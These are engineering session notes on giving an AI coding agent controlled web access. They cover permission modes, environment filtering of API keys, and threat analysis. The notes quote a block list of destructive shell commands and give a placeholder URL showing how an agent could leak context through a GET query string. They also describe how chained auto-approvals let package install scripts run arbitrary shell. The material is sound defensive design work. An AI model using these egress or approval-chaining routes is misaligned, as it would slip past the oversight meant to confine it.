# Session 18 Notes: Internet Access

**Date**: 2026-08-30
**Status**: ✅ Complete

## What Was Built

The agent got a first-class way to reach the internet — and the unexamined way it
was already reaching it got documented and annotated.

The framing changed during the session. The request was "enable internet access
extensions in the Pi agent framework", but Pi ships no web tool and every web
capability in its ecosystem (`pi-web-access`, `@pi-stef/web`, `pi-webfetch`,
`pi-smart-fetch`) is a third-party npm package loaded in-process via `jiti` with
full Node permissions. Such an extension loads *beside* `permission-gate.ts`
rather than behind it, and can touch the filesystem at module load before any
`tool_call` handler fires — so adopting one would contradict the project's
central claim that the gate is the only boundary between the model and the
filesystem. The tools were written natively instead, following `version-tools.ts`.

The second reframing: **the agent already had internet access.** `BLOCKED_COMMANDS`
was only `['rm -rf /', 'sudo', '> /dev', 'dd if=', 'mkfs', ':(){']`, and
`inspectCommand` scans for filesystem paths, so `bash curl https://example.com`
passed confinement untouched and ran unprompted under `bypassPermissions`. The
work was making network access legible, not making it possible.

### Files Created

1. **`apps/electron/src/main/agent/web-tools.ts`** — `web_fetch` and
   `install_deps` via `defineTool()`, plus `WEB_TOOL_NAMES`. `web_fetch` is
   GET-only with no body, bounded by time (15s), streamed response bytes (500KB),
   and result characters (100KB). HTML is reduced to readable text by a contained
   tag-stripping pass rather than a new dependency.
2. **`packages/shared/src/process/env.ts`** — `buildSubprocessEnv`, one filtered
   environment for every subprocess Pi Taster spawns.
3. **`packages/shared/src/apps/install.ts`** — `installDependencies`, shared by
   the Install button and the agent tool so there is one spawn path.
4. **`docs/skills/lookup-docs/SKILL.md`** — runtime skill teaching the agent when
   to check docs and that fetched pages are untrusted.

### Security Fix Found Along the Way

`apps:install-deps` spawned `bun install` with **no environment filtering** — it
inherited the full `process.env`, including `ANTHROPIC_API_KEY` and `GITHUB_TOKEN`.
`mcp-client.ts` had done this correctly for MCP servers all along. The list is now
shared, and both spawn sites use it.

### Two Things the Plan Got Wrong

Both were caught during verification, not review, and both are recorded in
`.claude/rules/self-modification.md` so the next reader does not repeat them.

**`install_deps` was going to be auto-approved in `acceptEdits`**, on the
reasoning that its command is fixed (`bun install`) and therefore cannot be
steered into arbitrary code. That is false: `bun install` runs the project's own
`preinstall` and `postinstall` scripts — verified empirically, not assumed — and
`acceptEdits` already lets the agent write `package.json` unprompted. Two
individually-innocuous auto-approvals compose into unprompted arbitrary shell.
The tool now asks outside `bypassPermissions`, like `bash`.

**`web_fetch` was described as unable to "send data anywhere"**, and that claim
was the stated basis for the `plan`-mode exception. Also false: the model
controls the whole URL, so a GET's path and query string are an egress channel —
`https://elsewhere.example/?p=<context>` exfiltrates as effectively as a POST.
The gating was kept (a GET still cannot write a file, run a command, or modify
the app, which is what `plan` actually promises), but every statement of the
claim in the code, `AGENTS.md`, and the rule was corrected. It is now recorded as
an accepted residual risk, mitigated only by every call and its URL landing in
the transcript.

### Permission Model

| Tool | `plan` | `default` | `acceptEdits` | `bypass` |
|---|---|---|---|---|
| `web_fetch` | **allow** | ask | **allow** | allow |
| `install_deps` | deny | ask | ask | allow |

`web_fetch` is the first and only exception to `plan` denying everything, so
`.claude/rules/self-modification.md` was amended in the same change rather than
left contradicting the code. `plan` now means *no side effects on the machine or
the app*, not *no tools*.

### Auto-Commit Gap Closed

The `tool_result` auto-commit hook keys on `input.path`, so a tool that writes
files without a `path` argument can never reach it. `install_deps` is exactly
that shape — no parameters, but `bun install` rewrites the lockfile. It now calls
`autoCommitInstallArtifacts` itself; otherwise a `rollback` would leave the
lockfile disagreeing with `package.json`, since `git checkout` does not remove
uncommitted files.

### Deliberately Not Built

No `web_search` and no search provider — that keeps the "no API key anywhere"
property and avoids fragile scraping. **No host policy**: `web_fetch` can reach
`localhost` (including Ollama on 11434), the LAN, and link-local metadata
addresses; `checkConfinement`'s URL branch is the hook if that ever changes. No
network off-switch setting, so no new `AppConfig` key and none of its four-way
declaration duplication. `describeNetworkUse` annotates `bash` network commands
for the approval prompt but blocks nothing — legibility, not enforcement.

## Verification

- `bun run typecheck:all` clean across all three workspaces.
- 39 assertions over `checkPermission`, `checkConfinement`, `inspectCommand`, and
  `describeNetworkUse`, including word-boundary cases (`ls src/curly` and
  `cat notes/curl.md` must not be flagged as network use).
- `web_fetch` exercised against real hosts: HTML, JSON, a 404, and rejected
  `file://` and malformed URLs.
- Env filter asserted to drop every blocked key while preserving `PATH`.
- Lockfile auto-commit verified against a real git repo (`install_deps: bun.lock`).
- Driven in the built app via the `run-app` skill: `web_fetch` runs in Explore
  mode with no approval prompt and the model reads the page; `bash curl` shows
  "This command reaches the network (curl)." on the approval prompt.
- Reviewed by `electron-security-reviewer` (found the `TextDecoder` flush bug,
  now fixed) and `self-modification-auditor` (found the `web_fetch` egress
  misstatement).
